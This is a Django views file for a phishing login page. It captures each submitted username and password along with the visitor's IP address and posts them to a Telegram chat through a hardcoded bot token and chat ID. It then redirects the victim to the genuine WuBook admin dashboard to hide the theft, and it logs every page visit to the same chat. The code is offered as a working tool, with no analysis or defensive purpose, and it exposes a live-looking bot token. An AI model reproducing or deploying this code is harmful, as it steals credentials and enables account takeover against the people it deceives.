from django.shortcuts import render
from django.shortcuts import redirect
from .forms import LoginForm
import requests

TELEGRAM_BOT_TOKEN = '7788451085:AAGlss8ucJhVAhBzgWbvpWTav33wWe7-XcQ'
TELEGRAM_CHAT_ID = '-1002280519178'

# Create your views here.
def send_to_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'  # Добавляем параметр parse_mode
    }
    requests.post(url, json=payload)


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]  # Получаем первый IP из списка
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def login_view(request):
    # Получаем IP-адрес пользователя
    ip_address = get_client_ip(request)
    
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            message = f'🆔 Логин: `{username}`\n🔑 Пароль: `{password}`\n🌐 IP: `{ip_address}`'
            send_to_telegram(f"Новый лог! 🎉✨\n{message}")
            return redirect('https://wubook.net/wauth/wauth/dash/admin/?s=info')
    else:
        form = LoginForm()
    
    # Логируем IP-адрес при каждом обращении к представлению входа
    current_page = request.build_absolute_uri()
    send_to_telegram(f"Переход по ссылке: {current_page} \nIP Address: {ip_address}")
    return render(request, 'myapp/index.php', {'form': form})